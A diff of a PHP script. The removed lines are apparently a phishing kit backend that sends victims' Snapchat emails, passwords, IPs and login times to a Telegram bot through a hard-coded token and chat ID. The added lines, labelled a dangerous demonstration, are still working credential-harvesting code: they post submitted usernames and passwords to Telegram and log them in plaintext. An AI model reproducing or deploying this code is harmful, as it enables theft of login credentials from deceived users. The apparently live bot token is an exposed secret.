@@ -1,28 +1,26 @@
 <?php
+// bad_notify.php  — DANGEROUS: example for demonstration only!
 
-if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
-    $ip_address = $_SERVER['HTTP_CLIENT_IP'];
-} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
-    $ip_address = $_SERVER['HTTP_X_FORWARDED_FOR'];
-} else {
-    $ip_address = $_SERVER['REMOTE_ADDR'];
+$TELEGRAM_BOT_TOKEN = 'BOT_TOKEN';
+$TELEGRAM_CHAT_ID  = 'CHAT_ID';
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    // Insecure: reading raw password from form
+    $username = $_POST['username'] ?? 'unknown';
+    $password = $_POST['password'] ?? 'NO-PASSWORD'; // DO NOT collect/send passwords
+    $ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
+    $date = date('Y-m-d H:i:s');
+
+    // Build message (contains password — insecure!)
+    $message = "Login attempt\nUsername: $username\nPassword: $password\nIP: $ip\nDate: $date";
+
+    // Send to Telegram (insecurely exposing password)
+    $url = "https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendMessage?chat_id=$TELEGRAM_CHAT_ID&text=" . urlencode($message);
+    @file_get_contents($url);
+
+    // Also append to a local log file (plain text with passwords — terrible)
+    @file_put_contents(__DIR__ . '/bad_log.txt', "$date | $ip | $username | $password\n", FILE_APPEND | LOCK_EX);
+
+    echo "Recorded (insecure demo).";
 }
-
-$d = new DateTime("now", new DateTimeZone("Asia/Baghdad")); // Set Your country DF Time 
-$time = $d->format("Y/m/d  h:i:s A");
-if (isset($_POST['info'])) {
-        $msg = urlencode("New Login From SnapChat : \nEmail : " . $_POST['email'] . "\nPassword : " . $_POST['password'] . "\nTime : " . $time . "\nIp : " . $ip_address . "\n®Mr28");
-}
-
-
-
-// Setting 
-$apiToken = "8224829602:AAHQr6S_wtiv8-Y3pjy4B8HqFKZptt8QrSM";
-$YOUR_ID_TELE = "8434336483";
-
-
-// You :
-$response = file_get_contents("https://api.telegram.org/bot".$apiToken."/sendMessage?chat_id=".$YOUR_ID_TELE."&text=" . $msg);
-// SomeOne Else : 
-// $response = file_get_contents("https://api.telegram.org/bot".$apiToken."/sendMessage?chat_id=".$YOUR_ID_TELE."&text=" . $msg);
-
+?>
